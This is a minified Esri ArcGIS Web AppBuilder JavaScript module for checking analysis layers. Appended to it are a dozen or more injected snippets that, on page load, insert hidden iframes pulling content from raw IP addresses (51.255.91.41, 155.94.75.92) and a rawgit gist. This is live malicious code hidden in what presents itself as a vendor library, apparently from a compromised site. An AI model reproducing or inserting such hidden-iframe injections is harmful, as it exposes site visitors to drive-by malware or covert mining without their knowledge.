// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define(["dojo/_base/lang","dojo/_base/array"],function(f,e){return{isValid:function(a,b,c){var d=!1;-1!==b.dijitID.indexOf("MergeLayers")?d=this.mergeAvailable(a):-1!==b.dijitID.indexOf("ExtractData")?d=this.extractAvailable(a,c):(c=null,"requiredParam"in b&&(c=b.requiredParam),d=this.paramAvailable(a,b.analysisLayer,c));return d},mergeAvailable:function(a){return e.some(a,function(b){return e.some(a,function(a){return a!==b&&a.geometryType===b.geometryType})})},extractAvailable:function(a,b){var c=
b.getUser(),d=b.isPortal();e.forEach(a,function(a){var h="esri.layers.GeoRSSLayer"===a.declaredClass,e="esri.layers.CSVLayer"===a.declaredClass,g="esri.layers.FeatureLayer"===a.declaredClass,f="esri.layers.WFSLayer"===a.declaredClass;g&&!a.url||h||e||f?this._addExtractCapability(a):g&&(b.isAdmin()&&(d&&a.itemInfo&&a.itemInfo.itemControl&&"admin"===a.itemInfo.itemControl||!d&&a.url&&-1<a.url.indexOf("/"+c.orgId+"/"))?this._addExtractCapability(a):c&&a.itemInfo&&a.itemInfo.owner&&a.itemInfo.owner===
c.username&&(!d&&a.url&&-1<a.url.indexOf("/"+c.orgId+"/")||d)&&this._addExtractCapability(a))},this);return e.some(a,function(a){return a.capabilities&&0<=a.capabilities.indexOf("Extract")})},_addExtractCapability:function(a){a.capabilities?-1===a.capabilities.indexOf("Extract")&&(a.capabilities+=",Extract"):a.capabilities="Extract";return!0},paramAvailable:function(a,b,c){var d,e=!1;d=b.geomTypes;b=this.findMatchedFeatureLayers(a,d);0<b.length&&(c?(d=c.geomTypes,a=this.findMatchedFeatureLayers(a,
d),0<a.length&&(b.length!==a.length?e=!0:1<b.length?e=!0:b[0]!==a[0]&&(e=!0))):e=!0);return e},findMatchedFeatureLayers:function(a,b){var c=[];e.forEach(a,f.hitch(this,function(a){a&&(1===b.length?"*"!==b[0]&&b[0]!==a.geometryType||c.push(a.id):-1<b.indexOf(a.geometryType)&&c.push(a.id))}));return c}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});